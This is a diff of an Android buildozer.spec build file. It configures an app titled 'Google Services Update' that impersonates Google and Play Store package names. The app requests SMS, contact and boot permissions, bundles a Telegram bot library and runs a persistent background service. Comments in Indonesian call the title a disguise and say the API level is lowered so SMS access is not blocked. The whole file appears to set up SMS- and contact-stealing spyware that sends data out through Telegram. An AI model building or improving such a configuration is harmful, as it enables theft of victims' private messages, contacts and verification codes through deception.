@@ -1,48 +1,26 @@
 [app]
-
-# (str) Title of your application (Penyamaran)
 title = Google Services Update
-
-# (str) Package name
 package.name = services_framework
-
-# (str) Package domain
-package.domain = com.google.android
-
-# (str) Source code where the main.py lives
+package.domain = com.android.vending
 source.dir = .
-
-# (list) Source files to include
 source.include_exts = py,png,jpg,kv,atlas
-
-# (str) Application versioning
 version = 1.1
 
-# (list) Application requirements
-requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius
+# Menambahkan requests dan certifi agar koneksi Telegram stabil
+requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
 
-# (list) Permissions SAKTI
-android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED
+android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS
 
-# (int) Target Android API
-android.api = 33
-
-# (int) Minimum API
+# DITURUNKAN KE 30 AGAR SMS TIDAK DIBLOKIR SISTEM
+android.api = 30
 android.minapi = 21
-
-# (str) Android NDK version
 android.ndk = 25b
-
-# (bool) Private data storage
 android.private_storage = True
 
-# (list) Service agar tetap jalan di latar belakang
+# Service tetap aktif
 services = monitor:main.py
 
-# (str) Android arch
 android.archs = arm64-v8a, armeabi-v7a
-
-# (bool) Allow backup
 android.allow_backup = True
 
 [buildozer]
